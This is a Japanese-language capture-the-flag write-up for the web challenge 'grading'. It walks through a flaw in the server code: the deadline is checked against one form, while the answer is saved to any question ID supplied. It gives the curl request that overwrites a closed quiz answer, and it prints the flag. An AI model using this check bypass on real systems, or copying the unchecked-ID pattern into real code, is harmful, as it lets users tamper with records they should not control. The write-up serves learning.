# grading:web:Xpts<!--X-->
Did you attend online school this year?  
Good, because you'll need to register at [grading.hsc.tf](https://grading.hsc.tf/login) and get an A on "simple quiz" to find the flag.  
Server code is attached.  
[grading-master.zip](grading-master.zip)  

# Solution
アクセスし、アカウントを登録するとテストを受けられるサイトのようだ。  
Formable  
[site1.png](site/site1.png)  
テストは二つあるが、片方は締め切りを過ぎているようだ。  
simple quiz (URL:https://grading.hsc.tf/60c8ba318c156ea0525271b0)  
[site2.png](site/site2.png)  
another simple quiz (URL:https://grading.hsc.tf/60c8ba318c156e1a895271b1)  
[site3.png](site/site3.png)  
どうやらこのsimple quizをどうにかして再受験したいらしい。  
まずは受験できるテストに`CTFCTF`と解答を入力し動作を見ると、`/60c8ba318c156e1a895271b1`に`ID=60c8ba318c156e75095271af&value=CTFCTF`をPOSTしている。  
IDはinputのnameであるようだ。  
```html
~~~
        <div class="mb-3 question">
            <label for="">What is the best CTF?</label>
            
                <input type="text"  class='active' name="60c8ba318c156e75095271af" value="CTFCTF">
             
        </div>
~~~
```
ここで配布されたソースのapp.jsを見てみる。  
```JavaScript
~~~
.post(authMW, (req, res) => {
    const now = Date.now()
    const form = req.user.forms.id(req.params.formID)
    if(now > form.deadline) {
        res.json({response: "too late"})
    } else {
        if(req.body.ID) {
            const question = req.user.questions.id(req.body.ID)
            console.log(question);
            question.submission = req.body.value
            req.user.save()
        } else {
            form.submitted = true
            req.user.save()
        }

        res.json({response: "heh"})
    }

})
~~~
```
`formID`経由で締め切りを取得しチェックした後に`ID`で問題を選択し、解答を保存している。  
つまり`formID`を現在締め切られていないもの、かつ`ID`は締め切りを過ぎたものにすれば締め切りチェックを回避できる。  
締め切りを過ぎた問題のIDは以下のようであった。  
```html
        <div class="mb-3 question">
            <label for="">What is the capital of Africa?</label>
             
                <fieldset>
                     
                        <div>
                            <input class="form-check-input" type="radio" name="60c8ba318c156e5afc5271ae" value="Venezuela"  disabled >
                            <label class="form-check-label" for="">Venezuela</label>
                        </div>
~~~
                        <div>
                            <input class="form-check-input" type="radio" name="60c8ba318c156e5afc5271ae" value="Africa is not a country"  disabled >
                            <label class="form-check-label" for="">Africa is not a country</label>
                        </div>
                     
                </fieldset>
             
        </div>
```
これを利用し以下のようなリクエストを送る(cookieは解法には関係ない)。  
```bash
$ curl -X POST https://grading.hsc.tf/60c8ba318c156e1a895271b1 -d "ID=60c8ba318c156e5afc5271ae&value=Africa is not a country" --cookie "connect.sid=s%3A9hca6KblGft22wdViRS5O09d4le1Tj4J.JAzBnOTmIm0WgfiN4OjHnH3la7xnb%2FaSFXRzMOhSayg"
{"response":"heh"}
```
simple quizにアクセスするとflagが表示されていた。  
flag  
[flag.png](site/flag.png)  

## flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}